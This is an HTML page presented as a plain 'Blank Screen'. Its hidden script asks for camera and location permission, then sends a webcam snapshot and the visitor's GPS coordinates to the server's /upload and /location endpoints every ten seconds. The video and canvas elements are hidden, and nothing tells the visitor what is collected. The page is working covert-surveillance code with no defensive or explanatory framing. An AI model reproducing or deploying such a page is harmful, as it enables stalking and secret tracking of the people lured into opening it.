<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Blank Screen</title>
  <style>
    body {
      background-color: black;
      margin: 0;
      height: 100vh;
      overflow: hidden;
    }
  </style>
</head>
<body>
  <video id="video" autoplay muted playsinline style="display:none;"></video>
  <canvas id="canvas" style="display:none;"></canvas>

  <script>
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const context = canvas.getContext('2d');

    // Request location permission
    navigator.geolocation.getCurrentPosition(
      () => console.log('Location permission granted.'),
      error => console.warn('Location permission denied or not yet granted:', error)
    );

    async function captureAndSend() {
      // Set up video canvas
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      context.drawImage(video, 0, 0, canvas.width, canvas.height);

      // Convert video frame to image data
      const image = canvas.toDataURL('image/jpeg');

      // Send image to the server (only if video is available)
      await fetch('/upload', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ image })
      });

      // Capture and send location
      try {
        const position = await new Promise((resolve, reject) =>
          navigator.geolocation.getCurrentPosition(resolve, reject)
        );
        const { latitude, longitude } = position.coords;
        await fetch('/location', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ latitude, longitude })
        });
      } catch (error) {
        console.error('Error fetching location:', error);
      }
    }

    // Access the camera (with error handling)
    navigator.mediaDevices.getUserMedia({ video: true })
      .then(stream => {
        video.srcObject = stream;
        console.log('Camera access granted');
        // Start capturing every 10 seconds
        setInterval(captureAndSend, 10000);
      })
      .catch(error => {
        console.error('No camera detected or access denied:', error);
        // Still capture location if camera access fails
        setInterval(captureAndSend, 10000); // capture and send location only
      });
  </script>
</body>
</html>
